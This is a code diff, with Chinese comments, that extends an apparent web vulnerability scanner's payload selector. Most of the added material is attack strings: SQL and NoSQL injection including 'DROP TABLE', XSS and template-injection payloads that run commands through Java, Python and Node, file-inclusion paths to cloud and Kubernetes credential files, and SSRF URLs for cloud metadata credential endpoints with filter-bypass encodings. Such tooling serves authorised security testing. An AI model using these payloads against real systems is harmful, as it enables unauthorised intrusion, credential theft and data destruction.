@@ -200,8 +200,8 @@ class SmartPayloadSelector:
         return scored_payloads[:max_count]
     
     def _get_all_payloads(self, vuln_type: str, target: TargetProfile) -> List[str]:
-        """获取指定类型的所有Payload"""
-        cache_key = f"{vuln_type}_{target.features.get('waf', 'none')}"
+        """获取指定类型的所有Payload - 增强版，提高检出率"""
+        cache_key = f"{vuln_type}_{target.features.get('waf', 'none')}_{target.features.get('framework', 'none')}"
         
         if cache_key in self.payload_cache:
             return self.payload_cache[cache_key]
@@ -213,6 +213,13 @@ class SmartPayloadSelector:
             dbms = self._guess_dbms(target)
             payloads = MegaPayloads.get("sqli", "all", dbms)
             
+            # 增加：多数据库payload以提高检出
+            other_dbms = ["mysql", "mssql", "postgresql", "oracle", "sqlite"]
+            other_dbms = [db for db in other_dbms if db != dbms]
+            for db in other_dbms[:2]:  # 添加其他2种常见数据库的payload
+                extra_payloads = MegaPayloads.get("sqli", "auth_bypass", db)
+                payloads.extend(extra_payloads[:5])  # 每种数据库取前5个
+            
             # 如果有WAF，添加绕过payload
             if target.features.get("waf"):
                 waf_bypass = MegaPayloads.WAF_BYPASS.get(
@@ -220,6 +227,9 @@ class SmartPayloadSelector:
                     MegaPayloads.WAF_BYPASS.get("comment", [])
                 )
                 payloads.extend(waf_bypass)
+            
+            # 增加：JSON/XML格式的SQL注入payload
+            payloads.extend(self._get_format_specific_sqli(target))
         
         elif vuln_type == "xss":
             payloads = MegaPayloads.get("xss", "all")
@@ -227,6 +237,14 @@ class SmartPayloadSelector:
             # 根据CSP调整
             if target.features.get("has_csp"):
                 payloads.extend(MegaPayloads.XSS.get("csp_bypass", []))
+            
+            # 增加：DOM XSS payload
+            payloads.extend(self._get_dom_xss_payloads())
+            
+            # 增加：框架特定XSS
+            framework = target.features.get("framework")
+            if framework:
+                payloads.extend(self._get_framework_xss_payloads(framework))
         
         elif vuln_type == "lfi":
             # 根据操作系统选择
@@ -235,6 +253,9 @@ class SmartPayloadSelector:
             else:
                 payloads = MegaPayloads.get("lfi", "linux")
             payloads.extend(MegaPayloads.get("lfi", "php_wrapper"))
+            
+            # 增加：云环境特定路径
+            payloads.extend(self._get_cloud_lfi_payloads())
         
         elif vuln_type == "rce":
             payloads = MegaPayloads.get("rce", "command_injection")
@@ -245,9 +266,16 @@ class SmartPayloadSelector:
                 payloads.extend(MegaPayloads.get("rce", "php"))
             elif lang == "java":
                 payloads.extend(MegaPayloads.get("rce", "log4j"))
+            elif lang == "python":
+                payloads.extend(self._get_python_rce_payloads())
+            elif lang == "node":
+                payloads.extend(self._get_node_rce_payloads())
         
         elif vuln_type == "ssrf":
             payloads = MegaPayloads.get("ssrf", "all")
+            
+            # 增加：云元数据地址
+            payloads.extend(self._get_cloud_ssrf_payloads())
         
         elif vuln_type == "xxe":
             payloads = MegaPayloads.get("xxe", "all")
@@ -362,6 +390,139 @@ class SmartPayloadSelector:
         
         keywords = framework_keywords.get(framework, [])
         return any(kw in payload.lower() for kw in keywords)
+    
+    # ========== 新增: 提高检出率的辅助方法 ==========
+    
+    def _get_format_specific_sqli(self, target: TargetProfile) -> List[str]:
+        """获取特定格式的SQL注入payload（JSON/XML等）"""
+        content_type = target.features.get("content_type", "").lower()
+        payloads = []
+        
+        if "json" in content_type:
+            payloads.extend([
+                '{"id":"1 OR 1=1--"}',
+                '{"id":"1\' OR \'1\'=\'1"}',
+                '{"id":{"$gt":""}}',  # NoSQL
+                '{"id":"1; DROP TABLE--"}',
+            ])
+        elif "xml" in content_type:
+            payloads.extend([
+                '<id>1\' OR \'1\'=\'1</id>',
+                '<id>1 UNION SELECT NULL--</id>',
+            ])
+        
+        return payloads
+    
+    def _get_dom_xss_payloads(self) -> List[str]:
+        """获取DOM XSS专用payload"""
+        return [
+            "javascript:alert(1)",
+            "#<script>alert(1)</script>",
+            "'-alert(1)-'",
+            "\"><img src=x onerror=alert(1)>",
+            "{{constructor.constructor('alert(1)')()}}",  # Angular
+            "${alert(1)}",  # Template injection
+            "{{7*7}}",  # SSTI probe
+            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+            "<svg/onload=alert(1)>",
+            "<body onpageshow=alert(1)>",
+            "<input onfocus=alert(1) autofocus>",
+            "<marquee onstart=alert(1)>",
+        ]
+    
+    def _get_framework_xss_payloads(self, framework: str) -> List[str]:
+        """获取框架特定XSS payload"""
+        framework_payloads = {
+            "django": [
+                "{{request|attr('class')|attr('mro')|attr('__getitem__')(1)}}",
+                "{% debug %}",
+            ],
+            "flask": [
+                "{{config}}",
+                "{{request.environ}}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+            ],
+            "rails": [
+                "<%= system('id') %>",
+                "<%== `id` %>",
+            ],
+            "laravel": [
+                "@{{phpinfo()}}",
+                "{{$on.constructor('alert(1)')()}}",
+            ],
+            "spring": [
+                "${T(java.lang.Runtime).getRuntime().exec('id')}",
+                "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
+            ],
+            "express": [
+                "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
+            ],
+        }
+        return framework_payloads.get(framework, [])
+    
+    def _get_cloud_lfi_payloads(self) -> List[str]:
+        """获取云环境LFI payload"""
+        return [
+            # AWS
+            "/proc/self/environ",
+            "/var/run/secrets/kubernetes.io/serviceaccount/token",
+            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+            "/.aws/credentials",
+            "/.docker/config.json",
+            # GCP
+            "/etc/google_application_default_credentials.json",
+            # Azure
+            "/.azure/accessTokens.json",
+            # 容器环境
+            "/proc/1/cgroup",
+            "/.dockerenv",
+        ]
+    
+    def _get_python_rce_payloads(self) -> List[str]:
+        """获取Python RCE payload"""
+        return [
+            "__import__('os').system('id')",
+            "eval(request.form.get('cmd'))",
+            "exec('import os;os.system(\"id\")')",
+            "__builtins__.__import__('os').popen('id').read()",
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        ]
+    
+    def _get_node_rce_payloads(self) -> List[str]:
+        """获取Node.js RCE payload"""
+        return [
+            "require('child_process').execSync('id')",
+            "global.process.mainModule.constructor._load('child_process').execSync('id')",
+            "this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
+        ]
+    
+    def _get_cloud_ssrf_payloads(self) -> List[str]:
+        """获取云环境SSRF payload"""
+        return [
+            # AWS IMDSv1
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://169.254.169.254/latest/user-data/",
+            "http://169.254.169.254/latest/dynamic/instance-identity/document",
+            # AWS IMDSv2 (需要特殊处理)
+            # GCP
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+            # Azure
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+            # 阿里云
+            "http://100.100.100.200/latest/meta-data/",
+            # DigitalOcean
+            "http://169.254.169.254/metadata/v1/",
+            # Kubernetes
+            "http://kubernetes.default.svc/",
+            "http://kubernetes.default.svc/api/v1/namespaces",
+            # 绕过技术
+            "http://[::ffff:169.254.169.254]/latest/meta-data/",
+            "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
+            "http://169.254.169.254.xip.io/latest/meta-data/",
+        ]
     
     def record_result(self, payload: str, success: bool, 
                       response_time: float = 0, waf_blocked: bool = False):
